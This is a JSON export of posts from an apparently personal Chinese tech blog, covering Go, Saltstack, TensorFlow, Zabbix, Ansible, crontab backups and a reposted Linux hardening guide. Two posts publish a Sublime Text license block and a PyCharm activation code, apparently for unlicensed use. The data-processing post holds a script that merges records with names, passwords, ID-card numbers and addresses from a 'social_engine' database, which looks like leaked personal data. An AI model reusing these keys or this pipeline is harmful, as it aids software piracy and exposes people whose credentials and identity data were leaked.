[{"title":"Golang折腾笔记","date":"2017-03-31T07:59:42.000Z","path":"others/Golang-折腾笔记/","text":"安装 env Mac OS 1brew install go 设置PATH和GOPATH,将如下内容写入.zshrc在家目录创建.gopath目录 12export PATH=$PATH:/usr/local/opt/go/libexec/binexport GOPATH=/Users/tp/.gopath","tags":[{"name":"Go","slug":"Go","permalink":"http://yoursite.com/tags/Go/"}]},{"title":"集中化管理平台-Saltstack","date":"2017-03-25T09:52:27.000Z","path":"devops/集中化管理平台-Saltstack/","text":"安装 使用的都是Ubuntu 所以按照官方文档进行安装 主控端12345apt-get install salt-apiapt-get install salt-cloudapt-get install salt-masterapt-get install salt-sshapt-get install salt-syndic 被控端12345apt-get install salt-apiapt-get install salt-cloudapt-get install salt-minionapt-get install salt-sshapt-get install salt-syndic 配置主控端 vim /etc/salt/master绑定IP地址自动认证指定Saltstack文件位置 1234567interface: 192.168.1.180auto_accept: truefile_roots: base: - /srv/salt/ 重启salt-master服务 1service salt-master restart 被控端 vim /etc/salt/minion指定master主机如果不设置id的话，默认使用主机名作为配置 12master: 192.168.1.180#id: minion-2017-05-05 重启salt-minion服务 1service salt-minion restart 测试连通性123➜ ~ salt &apos;printer&apos; test.pingprinter: True 其他操作","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"运维","slug":"运维","permalink":"http://yoursite.com/tags/运维/"}]},{"title":"数据处理","date":"2017-03-22T12:43:13.000Z","path":"others/数据处理/","text":"前言 最近在处理各种数据数据源一般有 普通文本、Access、csv、MSSQL等，比较杂乱而针对不同格式的处境，又要编写不同的脚本，将数据整理之后放入到MongoDB中记录如下： 文本格式 场景: 存在相同格式的多个文本数据，文件结构如下 代码实现 由于数据不便于公开，所以之贴出部分关键代码具体思路是从文件中读取数据后拼接成dict，然后append到list里最后在通过pymongo的insert_many将list插入到MongoDB中 12345678910111213# -*- coding: utf-8 -*-from IPython import embedfrom pymongo import MongoClientclient = MongoClient(connect=False)db = client.infoimport sysreload(sys)sys.setdefaultencoding('utf-8')FILE_LIST = ['1.txt', '2.txt', '3.txt', '4.txt'] SQL Server 对于SQL Server的数据源，一般是mdf文件；直接附加到SQL Server 数据库中然后通过Python连接到数据库(使用pyodbc)，执行SQL语句…… 代码实现 部分敏感字段已删除 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273# -*- coding: utf-8 -*-import pyodbcfrom IPython import embedfrom pymongo import MongoClientimport sysreload(sys)sys.setdefaultencoding('utf-8')client = MongoClient(connect=False)db = client.cninfoserver = '192.168.1.143'database = 'auction'username = 'sa'password = 'pass'driver= '&#123;ODBC Driver 13 for SQL Server&#125;'CONNECT_STR = 'DRIVER='+driver+';PORT=1433;SERVER='+server+';PORT=1443;DATABASE='+database+';UID='+username+';PWD='+ passwordSELECT_DATA_STR = (\"SELECT *****;\")def get_data_from_datas(): try: cursor.execute(SELECT_DATA_STR) return cursor.fetchall() except: print 'error'def data2json(data): \"\"\"\"将数据格式转换为json\"\"\" post = data[4] if data[4] else '' addr = u'&#123;&#125;&#123;&#125;'.format(data[5], data[6]) office_tel = data[8] if data[8] else '' mobile_tel = data[9] if data[9] else '' url = data[10] if data[10] else '' f_email1 = data[11] if data[11] else '' f_email2 = data[12] if data[12] else '' item = &#123; \"tips\": tips_str &#125; return itemdef insert_to_mongo(json_list): \"\"\"将数据插入mongo\"\"\" db.sedb.insert_many(json_list) passif __name__ == '__main__': cnxn = pyodbc.connect(CONNECT_STR) cursor = cnxn.cursor() json_list = [] datas = get_data_from_datas() for i in datas: json_list.append(data2json(i)) if len(json_list) == 2000: print \"2000 line data inserting……\" insert_to_mongo(json_list) json_list = [] if json_list: print \"inserting &#123;&#125; line\".format(len(json_list)) insert_to_mongo(json_list) json_list = [] 补充 又有一个场景是像弄两个MongoDB的数据整合于是就用Python编写了个多线程脚本，不断充源数据库中读取数据后存放到目标数据库中，代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# -*- coding: utf-8 -*-from pymongo import MongoClientfrom IPython import embedimport argparseimport threadingimport Queueimport sysreload(sys)sys.setdefaultencoding('utf8')parser = argparse.ArgumentParser(description='data migration')parser.add_argument('thread', type=int, help='write thread count')args = parser.parse_args()queue = Queue.Queue()host = '192.168.1.11'new_port = 27018client = MongoClient(host=host)client15t = MongoClient(host=host, port=new_port)cninfo = client.cninfosedb = cninfo.sedbsocial_db = client15t.social_enginehk = social_db.hongkongdef run(): while hk.count(): result = &#123;&#125; data = hk.find_one() result['realname'] = data['name'] result['username'] = data['username'] result['email'] = data['email'] result['password'] = data['password'] result['qq'] = data['phone'] result['shenfenzheng'] = data['id_card'] result['site'] = 'hk1t' result['tips'] = u'ip:&#123;&#125;,addr:&#123;&#125;,source:&#123;&#125;'.format( data['ip'], data['address'], data['source']) try: if hk.find_one_and_delete(&#123;'_id': data['_id']&#125;): sedb.insert(result) print hk.count() except: print 'Data has been deleted. ' pass # print datathreads = []for i in range(args.thread): t = threading.Thread(target=run) t.start()for t in threads: t.join()%","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"数据处理","slug":"数据处理","permalink":"http://yoursite.com/tags/数据处理/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://yoursite.com/tags/MongoDB/"},{"name":"SQL Server","slug":"SQL-Server","permalink":"http://yoursite.com/tags/SQL-Server/"}]},{"title":"TensorFlow环境搭建","date":"2017-03-19T15:52:42.000Z","path":"ml/TensorFlow环境搭建/","text":"前言 虽然之前零零散散的有看过TensorFlow, 但前些天才买了一本《TensorFlow实战》来系统的进行学习，所以这里记录一些笔记，以供备忘 测试环境搭建安装Anaconda3 之前自己本地使用的都是Anaconda2, 看到越来越多的东西都在推Py3,所以折腾TF的时候也安装个Anaconda3 123通过其官网下载命令行安装版https://repo.continuum.io/archive/Anaconda3-4.3.1-MacOSX-x86_64.sh然后直接 bash Anaconda3-4.3.1-MacOSX-x86_64.sh 安装成功后提示修改PATH由于我使用的是zsh，所以直接修改.zshrc文件即可 1234567891011121314151617installing: conda-env-2.6.0-0 ...Python 3.6.0 :: Continuum Analytics, Inc.creating default environment...installation finished.Do you wish the installer to prepend the Anaconda3 install locationto PATH in your /Users/tp/.bash_profile ? [yes|no][yes] &gt;&gt;&gt;Prepending PATH=/Users/tp/anaconda3/bin to PATH in /Users/tp/.bash_profileA backup will be made to: /Users/tp/.bash_profile-anaconda3.bakFor this change to become active, you have to open a new terminal.Thank you for installing Anaconda3!Share your notebooks and packages on Anaconda Cloud!Sign up for free: https://anaconda.org .zshrc中加入PATH1export PATH=&quot;/Users/tp/anaconda3/bin:$PATH&quot; 通过Anaconda安装TensorFlow环境1234567891011121314151617181920212223242526272829303132333435363738➜ ~ conda create -n tensorflow python=3.5Fetching package metadata ...........Solving package specifications: .Package plan for installation in environment /Users/tp/anaconda3/envs/tensorflow:The following NEW packages will be INSTALLED: openssl: 1.0.2k-1 pip: 9.0.1-py35_1 python: 3.5.3-1 readline: 6.2-2 setuptools: 27.2.0-py35_0 sqlite: 3.13.0-0 tk: 8.5.18-0 wheel: 0.29.0-py35_0 xz: 5.2.2-1 zlib: 1.2.8-3Proceed ([y]/n)? yopenssl-1.0.2k 100% |################################| Time: 0:00:01 1.72 MB/sreadline-6.2-2 100% |################################| Time: 0:00:00 11.93 MB/ssqlite-3.13.0- 100% |################################| Time: 0:00:00 6.10 MB/stk-8.5.18-0.ta 100% |################################| Time: 0:00:00 3.84 MB/sxz-5.2.2-1.tar 100% |################################| Time: 0:00:00 1.15 MB/szlib-1.2.8-3.t 100% |################################| Time: 0:00:00 8.54 MB/spython-3.5.3-1 100% |################################| Time: 0:00:02 5.15 MB/ssetuptools-27. 100% |################################| Time: 0:00:00 5.15 MB/swheel-0.29.0-p 100% |################################| Time: 0:00:00 6.24 MB/spip-9.0.1-py35 100% |################################| Time: 0:00:00 4.64 MB/s## To activate this environment, use:# &gt; source activate tensorflow## To deactivate this environment, use:# &gt; source deactivate tensorflow#","tags":[{"name":"TensorFlow","slug":"TensorFlow","permalink":"http://yoursite.com/tags/TensorFlow/"},{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"},{"name":"机器学习","slug":"机器学习","permalink":"http://yoursite.com/tags/机器学习/"}]},{"title":"数据备份脚本与crontab","date":"2017-03-14T11:52:44.000Z","path":"devops/数据备份脚本与crontab/","text":"目的1想实现将本机特定目录下的文件夹打包 然后rsync到备份服务器上，代码如下 文件保存7天 1234567891011#!/bin/bashcp -r /srv/docker/gitlab/gitlab /srv/cron/data/gitlabzip -P mima -rm boot-`date +%Y%m%d`.zip data/gitlab/mv boot-`date +%Y%m%d`.zip datafind . -type f -mtime +7 -exec rm -fr &#123;&#125; \\;rsync -av --progress -e \"ssh -p ServerSSHPort\" data ServerUserName@ServerIP::phone --partial --delete crontab命令格式 crontab [-u user] file crontab [-u user] [ -e | -l | -r ] -u user：用来设定某个用户的crontab服务；file：file是命令文件的名字,表示将file做为crontab的任务列表文件并载入crontab。如果在命令行中没有指定这个文件，crontab命令将接受标准输入（键盘）上键入的命令，并将它们载入crontab。-e：编辑某个用户的crontab文件内容。如果不指定用户，则表示编辑当前用户的crontab文件。-l：显示某个用户的crontab文件内容，如果不指定用户，则表示显示当前用户的crontab文件内容。-r：从/var/spool/cron目录中删除某个用户的crontab文件，如果不指定用户，则默认删除当前用户的crontab文件。-i：在删除用户的crontab文件时给确认提示。 12 列出crontab文件1crontab -l 对crontab作备份1crontab -l &gt; $HOME/mycron 文件格式123456第1列分钟0～59第2列小时0～23（0表示子夜）第3列日1～31第4列月1～12第5列星期0～7（0和7表示星期天）第6列要运行的命令 编辑crontab文件 crontab -e 123456789101112131415161718192021222324实例1：每1分钟执行一次myCommand* * * * * myCommand实例2：每小时的第3和第15分钟执行3,15 * * * * myCommand实例3：在上午8点到11点的第3和第15分钟执行3,15 8-11 * * * myCommand实例4：每隔两天的上午8点到11点的第3和第15分钟执行3,15 8-11 */2 * * myCommand实例5：每周一上午8点到11点的第3和第15分钟执行3,15 8-11 * * 1 myCommand实例6：每晚的21:30重启smb30 21 * * * /etc/init.d/smb restart实例7：每月1、10、22日的4 : 45重启smb45 4 1,10,22 * * /etc/init.d/smb restart实例8：每周六、周日的1 : 10重启smb10 1 * * 6,0 /etc/init.d/smb restart实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb0,30 18-23 * * * /etc/init.d/smb restart实例10：每星期六的晚上11 : 00 pm重启smb0 23 * * 6 /etc/init.d/smb restart实例11：每一小时重启smb* */1 * * * /etc/init.d/smb restart实例12：晚上11点到早上7点之间，每隔一小时重启smb0 23-7 * * * /etc/init.d/smb restart","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"sublime text 激活码","date":"2017-03-11T10:37:09.000Z","path":"others/sublime-text-激活码/","text":"12345678910111213----- BEGIN LICENSE -----Affinity Computer Technology10 User LicenseEA7E-909026D64472BD FA040F1B 20F23C0D 114D57E4AF4DDFDC A3FDDA29 00319FA1 91EE46D2B3210738 54154723 F12511D6 950F839DC5A83395 76EAEC5B FC25B644 9802A93128A62A8C 9483EC49 E28E1A3B 997FA0FA678ED4D3 2F4C2645 8E88274C 8AC599C2F2D578D3 DF19037B 544F5304 18F3F1966F1AC83E 2E1FCE1D BA74F528 1340A09F------ END LICENSE ------","tags":[]},{"title":"pycharm激活码","date":"2017-03-11T10:36:16.000Z","path":"others/pycharm激活码/","text":"1BIG3CLIK6F-eyJsaWNlbnNlSWQiOiJCSUczQ0xJSzZGIiwibGljZW5zZWVOYW1lIjoibGFuIHl1IiwiYXNzaWduZWVOYW1lIjoiIiwiYXNzaWduZWVFbWFpbCI6IiIsImxpY2Vuc2VSZXN0cmljdGlvbiI6IkZvciBlZHVjYXRpb25hbCB1c2Ugb25seSIsImNoZWNrQ29uY3VycmVudFVzZSI6ZmFsc2UsInByb2R1Y3RzIjpbeyJjb2RlIjoiQUMiLCJwYWlkVXBUbyI6IjIwMTctMTEtMjMifSx7ImNvZGUiOiJETSIsInBhaWRVcFRvIjoiMjAxNy0xMS0yMyJ9LHsiY29kZSI6IklJIiwicGFpZFVwVG8iOiIyMDE3LTExLTIzIn0seyJjb2RlIjoiUlMwIiwicGFpZFVwVG8iOiIyMDE3LTExLTIzIn0seyJjb2RlIjoiV1MiLCJwYWlkVXBUbyI6IjIwMTctMTEtMjMifSx7ImNvZGUiOiJEUE4iLCJwYWlkVXBUbyI6IjIwMTctMTEtMjMifSx7ImNvZGUiOiJSQyIsInBhaWRVcFRvIjoiMjAxNy0xMS0yMyJ9LHsiY29kZSI6IlBTIiwicGFpZFVwVG8iOiIyMDE3LTExLTIzIn0seyJjb2RlIjoiREMiLCJwYWlkVXBUbyI6IjIwMTctMTEtMjMifSx7ImNvZGUiOiJEQiIsInBhaWRVcFRvIjoiMjAxNy0xMS0yMyJ9LHsiY29kZSI6IlJNIiwicGFpZFVwVG8iOiIyMDE3LTExLTIzIn0seyJjb2RlIjoiUEMiLCJwYWlkVXBUbyI6IjIwMTctMTEtMjMifSx7ImNvZGUiOiJDTCIsInBhaWRVcFRvIjoiMjAxNy0xMS0yMyJ9XSwiaGFzaCI6IjQ3NzU1MTcvMCIsImdyYWNlUGVyaW9kRGF5cyI6MCwiYXV0b1Byb2xvbmdhdGVkIjpmYWxzZSwiaXNBdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlfQ==-iygsIMXTVeSyYkUxAqpHmymrgwN5InkOfeRhhPIPa88FO9FRuZosIBTY18tflChACznk3qferT7iMGKm7pumDTR4FbVVlK/3n1ER0eMKu2NcaXb7m10xT6kLW1Xb3LtuZEnuis5pYuEwT1zR7GskeNWdYZ0dAJpNDLFrqPyAPo5s1KLDHKpw+VfVd4uf7RMjOIzuJhAAYAG+amyivQt61I9aYiwpHQvUphvTwi0X0qL/oDJHAQbIv4Qwscyo4aYZJBKutYioZH9rgOP6Yw/sCltpoPWlJtDOcw/iEWYiCVG1pH9AWjCYXZ9AbbEBOWV71IQr5VWrsqFZ7cg7hLEJ3A==-MIIEPjCCAiagAwIBAgIBBTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTE1MTEwMjA4MjE0OFoXDTE4MTEwMTA4MjE0OFowETEPMA0GA1UEAwwGcHJvZDN5MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxcQkq+zdxlR2mmRYBPzGbUNdMN6OaXiXzxIWtMEkrJMO/5oUfQJbLLuMSMK0QHFmaI37WShyxZcfRCidwXjot4zmNBKnlyHodDij/78TmVqFl8nOeD5+07B8VEaIu7c3E1N+e1doC6wht4I4+IEmtsPAdoaj5WCQVQbrI8KeT8M9VcBIWX7fD0fhexfg3ZRt0xqwMcXGNp3DdJHiO0rCdU+Itv7EmtnSVq9jBG1usMSFvMowR25mju2JcPFp1+I4ZI+FqgR8gyG8oiNDyNEoAbsR3lOpI7grUYSvkB/xVy/VoklPCK2h0f0GJxFjnye8NT1PAywoyl7RmiAVRE/EKwIDAQABo4GZMIGWMAkGA1UdEwQCMAAwHQYDVR0OBBYEFGEpG9oZGcfLMGNBkY7SgHiMGgTcMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl/GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgWgMA0GCSqGSIb3DQEBCwUAA4ICAQC9WZuYgQedSuOc5TOUSrRigMw4/+wuC5EtZBfvdl4HT/8vzMW/oUlIP4YCvA0XKyBaCJ2iX+ZCDKoPfiYXiaSiH+HxAPV6J79vvouxKrWg2XV6ShFtPLP+0gPdGq3x9R3+kJbmAm8w+FOdlWqAfJrLvpzMGNeDU14YGXiZ9bVzmIQbwrBA+c/F4tlK/DV07dsNExihqFoibnqDiVNTGombaU2dDup2gwKdL81ua8EIcGNExHe82kjF4zwfadHk3bQVvbfdAwxcDy4xBjs3L4raPLU3yenSzr/OEur1+jfOxnQSmEcMXKXgrAQ9U55gwjcOFKrgOxEdek/Sk1VfOjvS+nuM4eyEruFMfaZHzoQiuw4IqgGc45ohFH0UUyjYcuFxxDSU9lMCv8qdHKm+wnPRb0l9l5vXsCBDuhAGYD6ss+Ga+aDY6f/qXZuUCEUOH3QUNbbCUlviSz6+GiRnt1kA9N2Qachl+2yBfaqUqr8h7Z2gsx5LcIf5kYNsqJ0GavXTVyWh7PYiKX4bs354ZQLUwwa/cG++2+wNWP+HtBhVxMRNTdVhSm38AknZlD+PTAsWGu9GyLmhti2EnVwGybSD2Dxmhxk3IPCkhKAK+pl0eWYGZWG3tJ9mZ7SowcXLWDFAk0lRJnKGFMTggrWjV8GYpw5bq23VmIqqDLgkNzuoog==","tags":[]},{"title":"zabbix 安装指南","date":"2017-02-24T08:19:56.000Z","path":"devops/zabbix-安装指南/","text":"添加仓库 12345678910111213141516171819202122232425For Ubuntu 16.04 LTS:wget http://repo.zabbix.com/zabbix/3.0/ubuntu/pool/main/z/zabbix-release/zabbix-release_3.0-1+xenial_all.debsudo dpkg -i zabbix-release_3.0-1+xenial_all.debsudo apt-get updateFor Ubuntu 14.04 LTS:wget http://repo.zabbix.com/zabbix/3.0/ubuntu/pool/main/z/zabbix-release/zabbix-release_3.0-1+trusty_all.debsudo dpkg -i zabbix-release_3.0-1+trusty_all.debsudo apt-get updateFor Debian 8:wget http://repo.zabbix.com/zabbix/3.0/debian/pool/main/z/zabbix-release/zabbix-release_3.0-1+jessie_all.debsudo dpkg -i zabbix-release_3.0-1+jessie_all.debsudo apt-get updateFor Debian 7:http://repo.zabbix.com/zabbix/3.0/debian/pool/main/z/zabbix-release/zabbix-release_3.0-1+wheezy_all.debsudo dpkg -i zabbix-release_3.0-1+wheezy_all.debsudo apt-get update 安装 PHP Mysql 12sudo apt-get updatesudo apt-get install apache2 mysql-server php libapache2-mod-php php-xml php-mysql php-bcmath php-mbstring php-gd zabbix-server-mysql php-mysql zabbix-frontend-php -y 安装zabbix server 1sudo apt-get install zabbix-server-mysql zabbix-frontend-php 修改zabbix server 配置文件 sudo vim /etc/zabbix/zabbix_server.conf 123DBName=zabbixDBUser=zabbixDBPassword=Your.Password.Here 修改php配置文件 vim /etc/php/7.0/apache2/php.ini 1234post_max_size = 16Mmax_execution_time = 300max_input_time = 300date.timezone = Asia/Shanghai 创建zabbix数据库用户和数据库 并授权 12345mysql -u root -pCREATE DATABASE zabbix;GRANT ALL on zabbix.* to zabbix@localhost IDENTIFIED BY 'zabbix';FLUSH PRIVILEGES; 导入数据 12cd /usr/share/doc/zabbix-server-mysqlzcat create.sql.gz | mysql -u root -p zabbix 重启Apache和zabbix 12sudo service apache2 restartsudo service zabbix-server restart http://localhost/zabbix 如果页面404 1234ln -s /etc/zabbix/apache.conf /etc/apache2/conf-available/zabbix.confa2enconf zabbix.confservice apache2 reload","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"zabbix","slug":"zabbix","permalink":"http://yoursite.com/tags/zabbix/"}]},{"title":"MSSQL 导数据出为sql文件","date":"2017-02-21T02:29:08.000Z","path":"others/MSSQL-导数据出为sql文件/","text":"选中要导出的数据库–&gt;任务–&gt;生成脚本 现“生成和发布脚本”窗口，点击下一步 选择要编写脚本的数据库对象，全部导出选第一个，如果你想导出部分数据勾选 第二个就好了 出现这个画面后点击”高级”按钮（重点） ”要编写脚本的数据的类型”对应：”架构和数据” 确定、下一步、下一步、大功告成。 原文做个备份","tags":[{"name":"数据处理","slug":"数据处理","permalink":"http://yoursite.com/tags/数据处理/"}]},{"title":"自动化运维工具-Ansible","date":"2017-02-20T14:12:41.000Z","path":"devops/自动化运维工具-Ansible/","text":"1. 安装 环境 MacOS 1sudo pip install ansible 2. 配置 创建hosts文件 12sudo mkdir -p /etc/ansiblesudo vim /etc/ansible/hosts 2.1 添加主机 在hosts中加入相应的主机，也可以根据自己实际情况创建相应组,比如我的 另外，如果修改了ssh默认端口，则在相应的ip后面加上端口 123456789[***]120.***.8.**:7788[***]***.***.***.230[local]192.168.1.180 还可以通过定义别名的方式将服务器信息写入hosts文件，如下其中jumper为该服务器别名，可根据自己实际情况修改为其它任意字符串 1jumper ansible_ssh_user=ubuntu ansible_ssh_host=***.***.***.230 相关的参数还有 1234567891011121314151617181920212223242526272829303132ansible_ssh_host 将要连接的远程主机名.与你想要设定的主机的别名不同的话,可通过此变量设置.ansible_ssh_port ssh端口号.如果不是默认的端口号,通过此变量设置.ansible_ssh_user 默认的 ssh 用户名ansible_ssh_pass ssh 密码(这种方式并不安全,我们强烈建议使用 --ask-pass 或 SSH 密钥)ansible_sudo_pass sudo 密码(这种方式并不安全,我们强烈建议使用 --ask-sudo-pass)ansible_sudo_exe (new in version 1.8) sudo 命令路径(适用于1.8及以上版本)ansible_connection 与主机的连接类型.比如:local, ssh 或者 paramiko. Ansible 1.2 以前默认使用 paramiko.1.2 以后默认使用 'smart','smart' 方式会根据是否支持 ControlPersist, 来判断'ssh' 方式是否可行.ansible_ssh_private_key_file ssh 使用的私钥文件.适用于有多个密钥,而你不想使用 SSH 代理的情况.ansible_shell_type 目标系统的shell类型.默认情况下,命令的执行使用 'sh' 语法,可设置为 'csh' 或 'fish'.ansible_python_interpreter 目标主机的 python 路径.适用于的情况: 系统中有多个 Python, 或者命令路径不是\"/usr/bin/python\",比如 \\*BSD, 或者 /usr/bin/python 不是 2.X 版本的 Python.我们不使用 \"/usr/bin/env\" 机制,因为这要求远程用户的路径设置正确,且要求 \"python\" 可执行程序名不可为 python以外的名字(实际有可能名为python26). 与 ansible_python_interpreter 的工作方式相同,可设定如 ruby 或 perl 的路径.... 2.2 测试连接主机 添加hosts后，就通过ping module测试是否能连接相应的主机 如果主机默认用户不是root，则可通过 -u 指定用户，如sudo ansible all -m ping -k -u username 123456789101112131415➜ ~ sudo ansible all -m ping -kSSH password:***.***.***.230 | UNREACHABLE! =&gt; &#123; \"changed\": false, \"msg\": \"('Bad authentication type', [u'publickey']) (allowed_types=[u'publickey'])\", \"unreachable\": true&#125;120.***.8.** | SUCCESS =&gt; &#123; \"changed\": false, \"ping\": \"pong\"&#125;192.168.1.180 | SUCCESS =&gt; &#123; \"changed\": false, \"ping\": \"pong\"&#125; 2.3 ansible-doc 使用过程中可以通过ansible-doc 查看一些模块的介绍 123➜ ~ ansible-doc -l | wc -l 773➜ ~ ansible-doc command 2.4 ansible基本功能-copy文件 实现将某文件copy到所有机器上，以nihao.py为例 1234567891011121314151617181920212223242526272829303132333435363738394041424344➜ ~ sudo ansible all -m copy -a \"src=nihao.py dest=/tmp/ \" -kSSH password:***.***.***.** | SUCCESS =&gt; &#123; \"changed\": true, \"checksum\": \"da39a3ee5e6b4b0d3255bfef95601890afd80709\", \"dest\": \"/tmp/nihao.py\", \"gid\": 0, \"group\": \"root\", \"md5sum\": \"d41d8cd98f00b204e9800998ecf8427e\", \"mode\": \"0644\", \"owner\": \"root\", \"size\": 0, \"src\": \"/root/.ansible/tmp/ansible-tmp-1489661516.77-128012169072532/source\", \"state\": \"file\", \"uid\": 0&#125;192.168.1.180 | SUCCESS =&gt; &#123; \"changed\": true, \"checksum\": \"da39a3ee5e6b4b0d3255bfef95601890afd80709\", \"dest\": \"/tmp/nihao.py\", \"gid\": 0, \"group\": \"root\", \"md5sum\": \"d41d8cd98f00b204e9800998ecf8427e\", \"mode\": \"0644\", \"owner\": \"root\", \"size\": 0, \"src\": \"/root/.ansible/tmp/ansible-tmp-1489661516.91-185355159665551/source\", \"state\": \"file\", \"uid\": 0&#125;backup | SUCCESS =&gt; &#123; \"changed\": true, \"checksum\": \"da39a3ee5e6b4b0d3255bfef95601890afd80709\", \"dest\": \"/tmp/nihao.py\", \"gid\": 500, \"group\": \"ubuntu\", \"md5sum\": \"d41d8cd98f00b204e9800998ecf8427e\", \"mode\": \"0664\", \"owner\": \"ubuntu\", \"size\": 0, \"src\": \"/home/ubuntu/.ansible/tmp/ansible-tmp-1489661517.06-86408822620129/source\", \"state\": \"file\", \"uid\": 500&#125; 然后查看是否在服务器上 12345678910➜ ~ sudo ansible all -m command -a \"ls -l /tmp/nihao.py\" -kSSH password:***.***.**.*** | SUCCESS | rc=0 &gt;&gt;-rw-r--r-- 1 root root 0 3月 16 18:51 /tmp/nihao.py120.132.8.73 | SUCCESS | rc=0 &gt;&gt;-rw-r--r-- 1 root root 0 Mar 16 00:51 /tmp/nihao.pybackup | SUCCESS | rc=0 &gt;&gt;-rw-rw-r-- 1 ubuntu ubuntu 0 Mar 16 18:51 /tmp/nihao.py 3. playbook Ansible 的配置管理脚本称为playbook每一个play必须包含以下两项 host: 需要配置的主机 task: 需要在这些主机上执行的任务 还有一些常见(非必须)的有name sudo 和vars(变量与其值组成的list)","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"运维","slug":"运维","permalink":"http://yoursite.com/tags/运维/"}]},{"title":"[转存]GNU/Linux安全基线与加固-0.3","date":"2017-02-14T22:41:16.000Z","path":"devops/转存-GNU-Linux安全基线与加固-0-3/","text":"原文链接 https://raw.githubusercontent.com/citypw/DNFWAH/master/4/d4_0x02_DNFWAH_gnu-linux_security_baseline_hardening.txt 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950[sth0r@shawn-fortress]$ uname -aLinux shawn-fortress 3.7-trunk-686-pae #1 SMP Debian 3.7.2-0+kali8 i686 GNU/Linux|=-----------------------------------------------------------------=||=-----=[ D O N O T F U C K W I T H A H A C K E R ]=-----=||=-----------------------------------------------------------------=||=------------------------[ #4 File 0x02 ]-------------------------=||=-----------------------------------------------------------------=||=----------------=[ GNU/Linux安全基线与加固-0.3 ]=----------------=||=-----------------------------------------------------------------=||=-------------------=[ By Shawn the R0ck ]=---------------------=||=-----------------------------------------------------------------=||=--------------------=[ 初稿:July 22 2014 ]=---------------------=||=-----------------------------------------------------------------=||=-------------------=[ Update: Jan 7 2015 ]=---------------------=||=-----------------------------------------------------------------=|--[ CONTENTS0. About this doc1. Routine security baseline 1.1 Security fix update 1.2 Password policy 1.3 SSH secure config 1.4 audit framework 1.4.1 file permission audit 1.4.2 Prevent *UNSET* bash history 1.5 sudoers2. Kernel security baseline3. Hardening 3.1 Kernel hardening - Grsecurity/PaX 3.2 PHP4. SSL/TLS Checklist5. Weirdo audit6. Reference 0. 关于这份文档12345678910111213随着GNU/Linux在各个行业的IT基础架构中的普及，安全问题也成为了关注的焦点，GNU/Linux主要是由GNU核心组建( 编译器GCC, C库Glibc等)和Linux内核组合而成，在自由开源软件统治着基础平台的大环境下，不少人认为开源一定是安全的，这是一种不完全正确的观念，Coverity的报告只是说明了开源比闭源更安全，这并不代表自由开源软件就是牢不可破的，自由开源软件在一定程度上具有一些安全的特性，这些特性不一定在GNU/Linux发行版中是默认开启，这些特性中有一些是必须在安全基线中去部署的，有一些可以根据具体需求来定制，这篇文档主要是介绍一些关于安全基线建设和加固的基本内容。在实际的安全咨询工作中，很多普通个人用户和企业用户并不是安全领域的黑客，大多客户都会要求给出一份简单易懂的部署文档，也就是所谓的安全基线，基线和加固是很大的话题，我会尽力不断更新这篇文档的内容，也希望有社区的朋友参与，本文所使用的GNU/Linux发行版是Debian。 1. 安全基线12在遵循最小安装和最小权限的部署原则下，还有一些地方是需要注意的，我们把这些部分称为安全基线。 1.1 安全修复更新123作为系统管理员，每天干的第1件事情就应该是查看生产环境的机器是否有安全修复的更新，甚至应该除了生产环境再另外跑一套模拟环境，用于测试升级后是否影响业务系统。 1234567891011Debian检查需要安全修复包：sudo apt-get upgrade -s | grep -i securityOpenSuSE发行版检查需要安全修复的包：sudo zypper lp | awk &apos;&#123; if ($7==&quot;security&quot;)&#123; if ($11==&quot;update&quot;) &#123;print $13&#125; else&#123; print $11 &#125;&#125;&#125;&apos; | sed &apos;s/:$//&apos; | grep -v &quot;^$&quot; | sort | uniqRHEL/CentOS( 6.4)检查需要安全修复的包和明细：sudo yum list-security | grep RHSAsudo yum info-security RHSA-NUMBER 1.2 密码策略1234567891011121314151617181920212223242526272829root密码策略至少应该考虑以下几点：1，密码强度，至少是大小写字母+数字+符号一共9位以上，PAM例子：password requisite pam_cracklib.so minlen=10 ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-12，不同的系统密码不能一样3，更换密码策略(每90天更换一次）4，密码分发管理，管理不同业务服务器的系统管理员掌握不同的密码PAM例子：分别代表最短密码长度为8,其中至少包含一个大写字母，一个小写字母，一个数字和一个字符, 编辑/etc/pam.d/passwd，增加：password requisite pam_cracklib.so minlen=8 ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1编辑/etc/login.defs，设置：PASS_MAX_DAYS 90 #密码最长生命周期90天PASS_WARN_AGE 7 #密码过期之前7天报警信息登录失败3次死锁，编辑/etc/pam.d/system-auth，设置：auth required pam_tally2.so onerr=fail even_deny_root deny=3 unlock_time=3600 1.2.1 业务分离123生产环境中,不同的业务可以做水平分离,比如把不同的服务运行到不同的虚拟机中,不需要远程访问的服务器可以绑定到 localhost( 比如只需要访问本机业务的mysql) 上。 1.3 